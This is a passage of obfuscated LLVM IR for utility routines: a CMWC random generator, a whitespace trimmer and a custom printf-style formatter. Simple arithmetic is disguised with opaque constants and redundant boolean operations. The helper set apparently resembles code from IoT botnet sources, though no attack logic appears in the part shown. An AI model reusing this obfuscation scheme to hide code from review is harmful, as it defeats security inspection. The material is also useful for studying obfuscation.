  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 151778246
  %7 = add i32 %6, 1
  %8 = sub i32 %7, 151778246
  %9 = add i32 %5, 1
  %10 = xor i32 %8, -1
  %11 = xor i32 4095, -1
  %12 = xor i32 1130627543, -1
  %13 = or i32 %10, %11
  %14 = or i32 1130627543, %12
  %15 = xor i32 %13, -1
  %16 = and i32 %15, %14
  %17 = and i32 %8, 4095
  store i32 %16, i32* @rand_cmwc.i, align 4
  %18 = load i64, i64* %2, align 8
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  %22 = load i32, i32* %21, align 4
  %23 = zext i32 %22 to i64
  %24 = mul i64 %18, %23
  %25 = load i32, i32* @c, align 4
  %26 = zext i32 %25 to i64
  %27 = sub i64 0, %24
  %28 = sub i64 0, %26
  %29 = add i64 %27, %28
  %30 = sub i64 0, %29
  %31 = add i64 %24, %26
  store i64 %30, i64* %1, align 8
  %32 = load i64, i64* %1, align 8
  %33 = lshr i64 %32, 32
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* @c, align 4
  %35 = load i64, i64* %1, align 8
  %36 = load i32, i32* @c, align 4
  %37 = zext i32 %36 to i64
  %38 = sub i64 0, %35
  %39 = sub i64 0, %37
  %40 = add i64 %38, %39
  %41 = sub i64 0, %40
  %42 = add i64 %35, %37
  %43 = trunc i64 %41 to i32
  store i32 %43, i32* %3, align 4
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* @c, align 4
  %46 = icmp ult i32 %44, %45
  br i1 %46, label %47, label %57

; <label>:47:                                     ; preds = %0
  %48 = load i32, i32* %3, align 4
  %49 = sub i32 0, 1
  %50 = sub i32 %48, %49
  %51 = add i32 %48, 1
  store i32 %50, i32* %3, align 4
  %52 = load i32, i32* @c, align 4
  %53 = add i32 %52, 809484360
  %54 = add i32 %53, 1
  %55 = sub i32 %54, 809484360
  %56 = add i32 %52, 1
  store i32 %55, i32* @c, align 4
  br label %57

; <label>:57:                                     ; preds = %47, %0
  %58 = load i32, i32* %4, align 4
  %59 = load i32, i32* %3, align 4
  %60 = sub i32 0, %59
  %61 = add i32 %58, %60
  %62 = sub i32 %58, %59
  %63 = load i32, i32* @rand_cmwc.i, align 4
  %64 = zext i32 %63 to i64
  %65 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %64
  store i32 %61, i32* %65, align 4
  ret i32 %61
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = add i64 %7, -252743398680212708
  %9 = sub i64 %8, 1
  %10 = sub i64 %9, -252743398680212708
  %11 = sub i64 %7, 1
  %12 = trunc i64 %10 to i32
  store i32 %12, i32* %5, align 4
  br label %13

; <label>:13:                                     ; preds = %22, %1
  %14 = load i8*, i8** %2, align 8
  %15 = load i32, i32* %4, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i8, i8* %14, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = call i32 @isspace(i32 %19) #10
  %21 = icmp ne i32 %20, 0
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %13
  %23 = load i32, i32* %4, align 4
  %24 = sub i32 0, %23
  %25 = sub i32 0, 1
  %26 = add i32 %24, %25
  %27 = sub i32 0, %26
  %28 = add nsw i32 %23, 1
  store i32 %27, i32* %4, align 4
  br label %13

; <label>:29:                                     ; preds = %13
  br label %30

; <label>:30:                                     ; preds = %45, %29
  %31 = load i32, i32* %5, align 4
  %32 = load i32, i32* %4, align 4
  %33 = icmp sge i32 %31, %32
  br i1 %33, label %34, label %43

; <label>:34:                                     ; preds = %30
  %35 = load i8*, i8** %2, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = sext i8 %39 to i32
  %41 = call i32 @isspace(i32 %40) #10
  %42 = icmp ne i32 %41, 0
  br label %43

; <label>:43:                                     ; preds = %34, %30
  %44 = phi i1 [ false, %30 ], [ %42, %34 ]
  br i1 %44, label %45, label %50

; <label>:45:                                     ; preds = %43
  %46 = load i32, i32* %5, align 4
  %47 = sub i32 0, -1
  %48 = sub i32 %46, %47
  %49 = add nsw i32 %46, -1
  store i32 %48, i32* %5, align 4
  br label %30

; <label>:50:                                     ; preds = %43
  %51 = load i32, i32* %4, align 4
  store i32 %51, i32* %3, align 4
  br label %52

; <label>:52:                                     ; preds = %71, %50
  %53 = load i32, i32* %3, align 4
  %54 = load i32, i32* %5, align 4
  %55 = icmp sle i32 %53, %54
  br i1 %55, label %56, label %77

; <label>:56:                                     ; preds = %52
  %57 = load i8*, i8** %2, align 8
  %58 = load i32, i32* %3, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  %61 = load i8, i8* %60, align 1
  %62 = load i8*, i8** %2, align 8
  %63 = load i32, i32* %3, align 4
  %64 = load i32, i32* %4, align 4
  %65 = sub i32 %63, 104949847
  %66 = sub i32 %65, %64
  %67 = add i32 %66, 104949847
  %68 = sub nsw i32 %63, %64
  %69 = sext i32 %67 to i64
  %70 = getelementptr inbounds i8, i8* %62, i64 %69
  store i8 %61, i8* %70, align 1
  br label %71

; <label>:71:                                     ; preds = %56
  %72 = load i32, i32* %3, align 4
  %73 = add i32 %72, 1527490907
  %74 = add i32 %73, 1
  %75 = sub i32 %74, 1527490907
  %76 = add nsw i32 %72, 1
  store i32 %75, i32* %3, align 4
  br label %52

; <label>:77:                                     ; preds = %52
  %78 = load i8*, i8** %2, align 8
  %79 = load i32, i32* %3, align 4
  %80 = load i32, i32* %4, align 4
  %81 = sub i32 0, %80
  %82 = add i32 %79, %81
  %83 = sub nsw i32 %79, %80
  %84 = sext i32 %82 to i64
  %85 = getelementptr inbounds i8, i8* %78, i64 %84
  store i8 0, i8* %85, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %339, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %342

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %327

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %342

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %328

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %70

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = xor i32 %53, -1
  %55 = xor i32 2, -1
  %56 = xor i32 -1779452318, -1
  %57 = and i32 %54, -1779452318
  %58 = and i32 %53, %56
  %59 = and i32 %55, -1779452318
  %60 = and i32 2, %56
  %61 = or i32 %57, %58
  %62 = or i32 %59, %60
  %63 = xor i32 %61, %62
  %64 = or i32 %54, %55
  %65 = xor i32 %64, -1
  %66 = or i32 -1779452318, %56
  %67 = and i32 %65, %66
  %68 = or i32 %63, %67
  %69 = or i32 %53, 2
  store i32 %68, i32* %8, align 4
  br label %45

; <label>:70:                                     ; preds = %45
  br label %71

; <label>:71:                                     ; preds = %97, %70
  %72 = load i8*, i8** %5, align 8
  %73 = load i8, i8* %72, align 1
  %74 = zext i8 %73 to i32
  %75 = icmp sge i32 %74, 48
  br i1 %75, label %76, label %81

; <label>:76:                                     ; preds = %71
  %77 = load i8*, i8** %5, align 8
  %78 = load i8, i8* %77, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp sle i32 %79, 57
  br label %81

; <label>:81:                                     ; preds = %76, %71
  %82 = phi i1 [ false, %71 ], [ %80, %76 ]
  br i1 %82, label %83, label %100

; <label>:83:                                     ; preds = %81
  %84 = load i32, i32* %7, align 4
  %85 = mul nsw i32 %84, 10
  store i32 %85, i32* %7, align 4
  %86 = load i8*, i8** %5, align 8
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = add i32 %88, 490448280
  %90 = sub i32 %89, 48
  %91 = sub i32 %90, 490448280
  %92 = sub nsw i32 %88, 48
  %93 = load i32, i32* %7, align 4
  %94 = sub i32 0, %91
  %95 = sub i32 %93, %94
  %96 = add nsw i32 %93, %91
  store i32 %95, i32* %7, align 4
  br label %97

; <label>:97:                                     ; preds = %83
  %98 = load i8*, i8** %5, align 8
  %99 = getelementptr inbounds i8, i8* %98, i32 1
  store i8* %99, i8** %5, align 8
  br label %71

; <label>:100:                                    ; preds = %81
  %101 = load i8*, i8** %5, align 8
  %102 = load i8, i8* %101, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 115
  br i1 %104, label %105, label %145

; <label>:105:                                    ; preds = %100
  %106 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %107 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %106, i32 0, i32 0
  %108 = load i32, i32* %107, align 8
  %109 = icmp ule i32 %108, 40
  br i1 %109, label %110, label %120

; <label>:110:                                    ; preds = %105
  %111 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %106, i32 0, i32 3
  %112 = load i8*, i8** %111, align 8
  %113 = getelementptr i8, i8* %112, i32 %108
  %114 = bitcast i8* %113 to i64*
  %115 = sub i32 0, %108
  %116 = sub i32 0, 8
  %117 = add i32 %115, %116
  %118 = sub i32 0, %117
  %119 = add i32 %108, 8
  store i32 %118, i32* %107, align 8
  br label %125

; <label>:120:                                    ; preds = %105
  %121 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %106, i32 0, i32 2
  %122 = load i8*, i8** %121, align 8
  %123 = bitcast i8* %122 to i64*
  %124 = getelementptr i8, i8* %122, i32 8
  store i8* %124, i8** %121, align 8
  br label %125

; <label>:125:                                    ; preds = %120, %110
  %126 = phi i64* [ %114, %110 ], [ %123, %120 ]
  %127 = load i64, i64* %126, align 8
  %128 = inttoptr i64 %127 to i8*
  store i8* %128, i8** %11, align 8
  %129 = load i8**, i8*** %4, align 8
  %130 = load i8*, i8** %11, align 8
  %131 = icmp ne i8* %130, null
  br i1 %131, label %132, label %134

; <label>:132:                                    ; preds = %125
  %133 = load i8*, i8** %11, align 8
  br label %135

; <label>:134:                                    ; preds = %125
  br label %135

; <label>:135:                                    ; preds = %134, %132
  %136 = phi i8* [ %133, %132 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.117, i32 0, i32 0), %134 ]
  %137 = load i32, i32* %7, align 4
  %138 = load i32, i32* %8, align 4
  %139 = call i32 @prints(i8** %129, i8* %136, i32 %137, i32 %138)
  %140 = load i32, i32* %9, align 4
  %141 = sub i32 %140, -628355635
  %142 = add i32 %141, %139
  %143 = add i32 %142, -628355635
  %144 = add nsw i32 %140, %139
  store i32 %143, i32* %9, align 4
  br label %339

; <label>:145:                                    ; preds = %100
  %146 = load i8*, i8** %5, align 8
  %147 = load i8, i8* %146, align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 100
  br i1 %149, label %150, label %179

; <label>:150:                                    ; preds = %145
  %151 = load i8**, i8*** %4, align 8
  %152 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %153 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 8
  %155 = icmp ule i32 %154, 40
  br i1 %155, label %156, label %164

; <label>:156:                                    ; preds = %150
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %152, i32 0, i32 3
  %158 = load i8*, i8** %157, align 8
  %159 = getelementptr i8, i8* %158, i32 %154
  %160 = bitcast i8* %159 to i32*
  %161 = sub i32 0, 8
  %162 = sub i32 %154, %161
  %163 = add i32 %154, 8
  store i32 %162, i32* %153, align 8
  br label %169

; <label>:164:                                    ; preds = %150
  %165 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %152, i32 0, i32 2
  %166 = load i8*, i8** %165, align 8
  %167 = bitcast i8* %166 to i32*
  %168 = getelementptr i8, i8* %166, i32 8
  store i8* %168, i8** %165, align 8
  br label %169

; <label>:169:                                    ; preds = %164, %156
  %170 = phi i32* [ %160, %156 ], [ %167, %164 ]
  %171 = load i32, i32* %170, align 4
  %172 = load i32, i32* %7, align 4
  %173 = load i32, i32* %8, align 4
  %174 = call i32 @printi(i8** %151, i32 %171, i32 10, i32 1, i32 %172, i32 %173, i32 97)
  %175 = load i32, i32* %9, align 4
  %176 = sub i32 0, %174
  %177 = sub i32 %175, %176
  %178 = add nsw i32 %175, %174
  store i32 %177, i32* %9, align 4
  br label %339

; <label>:179:                                    ; preds = %145
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 120
  br i1 %183, label %184, label %214

; <label>:184:                                    ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %199

; <label>:190:                                    ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = sub i32 %188, -13297993
  %196 = add i32 %195, 8
  %197 = add i32 %196, -13297993
  %198 = add i32 %188, 8
  store i32 %197, i32* %187, align 8
  br label %204

; <label>:199:                                    ; preds = %184
  %200 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %201 = load i8*, i8** %200, align 8
  %202 = bitcast i8* %201 to i32*
  %203 = getelementptr i8, i8* %201, i32 8
  store i8* %203, i8** %200, align 8
  br label %204

; <label>:204:                                    ; preds = %199, %190
  %205 = phi i32* [ %194, %190 ], [ %202, %199 ]
  %206 = load i32, i32* %205, align 4
  %207 = load i32, i32* %7, align 4
  %208 = load i32, i32* %8, align 4
  %209 = call i32 @printi(i8** %185, i32 %206, i32 16, i32 0, i32 %207, i32 %208, i32 97)
  %210 = load i32, i32* %9, align 4
  %211 = sub i32 0, %209
  %212 = sub i32 %210, %211
  %213 = add nsw i32 %210, %209
  store i32 %212, i32* %9, align 4
  br label %339

; <label>:214:                                    ; preds = %179
  %215 = load i8*, i8** %5, align 8
  %216 = load i8, i8* %215, align 1
  %217 = zext i8 %216 to i32
  %218 = icmp eq i32 %217, 88
  br i1 %218, label %219, label %249

; <label>:219:                                    ; preds = %214
  %220 = load i8**, i8*** %4, align 8
  %221 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %222 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %221, i32 0, i32 0
  %223 = load i32, i32* %222, align 8
  %224 = icmp ule i32 %223, 40
  br i1 %224, label %225, label %234

; <label>:225:                                    ; preds = %219
  %226 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %221, i32 0, i32 3
  %227 = load i8*, i8** %226, align 8
  %228 = getelementptr i8, i8* %227, i32 %223
  %229 = bitcast i8* %228 to i32*
  %230 = add i32 %223, -389922786
  %231 = add i32 %230, 8
  %232 = sub i32 %231, -389922786
  %233 = add i32 %223, 8
  store i32 %232, i32* %222, align 8
  br label %239

; <label>:234:                                    ; preds = %219
  %235 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %221, i32 0, i32 2
  %236 = load i8*, i8** %235, align 8
  %237 = bitcast i8* %236 to i32*
  %238 = getelementptr i8, i8* %236, i32 8
  store i8* %238, i8** %235, align 8
  br label %239

; <label>:239:                                    ; preds = %234, %225
  %240 = phi i32* [ %229, %225 ], [ %237, %234 ]
  %241 = load i32, i32* %240, align 4
  %242 = load i32, i32* %7, align 4
  %243 = load i32, i32* %8, align 4
  %244 = call i32 @printi(i8** %220, i32 %241, i32 16, i32 0, i32 %242, i32 %243, i32 65)
  %245 = load i32, i32* %9, align 4
  %246 = sub i32 0, %244
  %247 = sub i32 %245, %246
  %248 = add nsw i32 %245, %244
  store i32 %247, i32* %9, align 4
  br label %339

; <label>:249:                                    ; preds = %214
  %250 = load i8*, i8** %5, align 8
  %251 = load i8, i8* %250, align 1
  %252 = zext i8 %251 to i32
  %253 = icmp eq i32 %252, 117
  br i1 %253, label %254, label %285

; <label>:254:                                    ; preds = %249
  %255 = load i8**, i8*** %4, align 8
  %256 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %257 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %256, i32 0, i32 0
  %258 = load i32, i32* %257, align 8
  %259 = icmp ule i32 %258, 40
  br i1 %259, label %260, label %268

; <label>:260:                                    ; preds = %254
  %261 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %256, i32 0, i32 3
  %262 = load i8*, i8** %261, align 8
  %263 = getelementptr i8, i8* %262, i32 %258
  %264 = bitcast i8* %263 to i32*
  %265 = sub i32 0, 8
  %266 = sub i32 %258, %265
  %267 = add i32 %258, 8
  store i32 %266, i32* %257, align 8
  br label %273

; <label>:268:                                    ; preds = %254
  %269 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %256, i32 0, i32 2
  %270 = load i8*, i8** %269, align 8
  %271 = bitcast i8* %270 to i32*
  %272 = getelementptr i8, i8* %270, i32 8
  store i8* %272, i8** %269, align 8
  br label %273

; <label>:273:                                    ; preds = %268, %260
  %274 = phi i32* [ %264, %260 ], [ %271, %268 ]
  %275 = load i32, i32* %274, align 4
  %276 = load i32, i32* %7, align 4
  %277 = load i32, i32* %8, align 4
  %278 = call i32 @printi(i8** %255, i32 %275, i32 10, i32 0, i32 %276, i32 %277, i32 97)
  %279 = load i32, i32* %9, align 4
  %280 = sub i32 0, %279
  %281 = sub i32 0, %278
  %282 = add i32 %280, %281
  %283 = sub i32 0, %282
  %284 = add nsw i32 %279, %278
  store i32 %283, i32* %9, align 4
  br label %339

; <label>:285:                                    ; preds = %249
  %286 = load i8*, i8** %5, align 8
  %287 = load i8, i8* %286, align 1
  %288 = zext i8 %287 to i32
  %289 = icmp eq i32 %288, 99
  br i1 %289, label %290, label %326

; <label>:290:                                    ; preds = %285
  %291 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %292 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %291, i32 0, i32 0
  %293 = load i32, i32* %292, align 8
  %294 = icmp ule i32 %293, 40
  br i1 %294, label %295, label %304

; <label>:295:                                    ; preds = %290
  %296 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %291, i32 0, i32 3
  %297 = load i8*, i8** %296, align 8
  %298 = getelementptr i8, i8* %297, i32 %293
  %299 = bitcast i8* %298 to i32*
  %300 = add i32 %293, -1492367935
  %301 = add i32 %300, 8
  %302 = sub i32 %301, -1492367935
  %303 = add i32 %293, 8
  store i32 %302, i32* %292, align 8
  br label %309

; <label>:304:                                    ; preds = %290
  %305 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %291, i32 0, i32 2
  %306 = load i8*, i8** %305, align 8
  %307 = bitcast i8* %306 to i32*
  %308 = getelementptr i8, i8* %306, i32 8
  store i8* %308, i8** %305, align 8
  br label %309

; <label>:309:                                    ; preds = %304, %295
  %310 = phi i32* [ %299, %295 ], [ %307, %304 ]
  %311 = load i32, i32* %310, align 4
  %312 = trunc i32 %311 to i8
  %313 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %312, i8* %313, align 1
  %314 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %314, align 1
  %315 = load i8**, i8*** %4, align 8
  %316 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %317 = load i32, i32* %7, align 4
  %318 = load i32, i32* %8, align 4
  %319 = call i32 @prints(i8** %315, i8* %316, i32 %317, i32 %318)
  %320 = load i32, i32* %9, align 4
  %321 = sub i32 0, %320
  %322 = sub i32 0, %319
  %323 = add i32 %321, %322
  %324 = sub i32 0, %323
  %325 = add nsw i32 %320, %319
  store i32 %324, i32* %9, align 4
  br label %339

; <label>:326:                                    ; preds = %285
  br label %338

; <label>:327:                                    ; preds = %17
  br label %328

; <label>:328:                                    ; preds = %327, %35
  %329 = load i8**, i8*** %4, align 8
  %330 = load i8*, i8** %5, align 8
  %331 = load i8, i8* %330, align 1
  %332 = zext i8 %331 to i32
  call void @printchar(i8** %329, i32 %332)
  %333 = load i32, i32* %9, align 4
  %334 = add i32 %333, -507952081
  %335 = add i32 %334, 1
  %336 = sub i32 %335, -507952081
  %337 = add nsw i32 %333, 1
  store i32 %336, i32* %9, align 4
  br label %338

; <label>:338:                                    ; preds = %328, %326
  br label %339

; <label>:339:                                    ; preds = %338, %309, %273, %239, %204, %169, %135
  %340 = load i8*, i8** %5, align 8
  %341 = getelementptr inbounds i8, i8* %340, i32 1
  store i8* %341, i8** %5, align 8
  br label %12

; <label>:342:                                    ; preds = %29, %12
  %343 = load i8**, i8*** %4, align 8
  %344 = icmp ne i8** %343, null
  br i1 %344, label %345, label %348

; <label>:345:                                    ; preds = %342
  %346 = load i8**, i8*** %4, align 8
  %347 = load i8*, i8** %346, align 8
  store i8 0, i8* %347, align 1
  br label %348

; <label>:348:                                    ; preds = %345, %342
  %349 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %350 = bitcast %struct.__va_list_tag* %349 to i8*
  call void @llvm.va_end(i8* %350)
  %351 = load i32, i32* %9, align 4
  ret i32 %351
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %55

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %27, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %30

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = sub i32 %22, 1157175880
  %24 = add i32 %23, 1
  %25 = add i32 %24, 1157175880
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %11, align 4
  br label %27

; <label>:27:                                     ; preds = %21
  %28 = load i8*, i8** %12, align 8
  %29 = getelementptr inbounds i8, i8* %28, i32 1
  store i8* %29, i8** %12, align 8
  br label %17

; <label>:30:                                     ; preds = %17
  %31 = load i32, i32* %11, align 4
  %32 = load i32, i32* %7, align 4
  %33 = icmp sge i32 %31, %32
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %30
  store i32 0, i32* %7, align 4
  br label %42

; <label>:35:                                     ; preds = %30
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = add i32 %37, 1701918110
  %39 = sub i32 %38, %36
  %40 = sub i32 %39, 1701918110
  %41 = sub nsw i32 %37, %36
  store i32 %40, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %35, %34
  %43 = load i32, i32* %8, align 4
  %44 = xor i32 %43, -1
  %45 = xor i32 2, -1
  %46 = xor i32 870007691, -1
  %47 = or i32 %44, %45
  %48 = or i32 870007691, %46
  %49 = xor i32 %47, -1
  %50 = and i32 %49, %48
  %51 = and i32 %43, 2
  %52 = icmp ne i32 %50, 0
  br i1 %52, label %53, label %54

; <label>:53:                                     ; preds = %42
  store i32 48, i32* %10, align 4
  br label %54

; <label>:54:                                     ; preds = %53, %42
  br label %55

; <label>:55:                                     ; preds = %54, %4
  %56 = load i32, i32* %8, align 4
  %57 = xor i32 1, -1
  %58 = xor i32 %56, %57
  %59 = and i32 %58, %56
  %60 = and i32 %56, 1
  %61 = icmp ne i32 %59, 0
  br i1 %61, label %80, label %62

; <label>:62:                                     ; preds = %55
  br label %63

; <label>:63:                                     ; preds = %73, %62
  %64 = load i32, i32* %7, align 4
  %65 = icmp sgt i32 %64, 0
  br i1 %65, label %66, label %79

; <label>:66:                                     ; preds = %63
  %67 = load i8**, i8*** %5, align 8
  %68 = load i32, i32* %10, align 4
  call void @printchar(i8** %67, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = sub i32 0, 1
  %71 = sub i32 %69, %70
  %72 = add nsw i32 %69, 1
  store i32 %71, i32* %9, align 4
  br label %73

; <label>:73:                                     ; preds = %66
  %74 = load i32, i32* %7, align 4
  %75 = add i32 %74, 1294405226
  %76 = add i32 %75, -1
  %77 = sub i32 %76, 1294405226
  %78 = add nsw i32 %74, -1
  store i32 %77, i32* %7, align 4
  br label %63

; <label>:79:                                     ; preds = %63
  br label %80

; <label>:80:                                     ; preds = %79, %55
  br label %81

; <label>:81:                                     ; preds = %94, %80
  %82 = load i8*, i8** %6, align 8
  %83 = load i8, i8* %82, align 1
  %84 = icmp ne i8 %83, 0
  br i1 %84, label %85, label %97

; <label>:85:                                     ; preds = %81
  %86 = load i8**, i8*** %5, align 8
  %87 = load i8*, i8** %6, align 8
  %88 = load i8, i8* %87, align 1
  %89 = zext i8 %88 to i32
  call void @printchar(i8** %86, i32 %89)
  %90 = load i32, i32* %9, align 4
  %91 = sub i32 0, 1
  %92 = sub i32 %90, %91
  %93 = add nsw i32 %90, 1
  store i32 %92, i32* %9, align 4
  br label %94

; <label>:94:                                     ; preds = %85
  %95 = load i8*, i8** %6, align 8
  %96 = getelementptr inbounds i8, i8* %95, i32 1
  store i8* %96, i8** %6, align 8
  br label %81

; <label>:97:                                     ; preds = %81
  br label %98

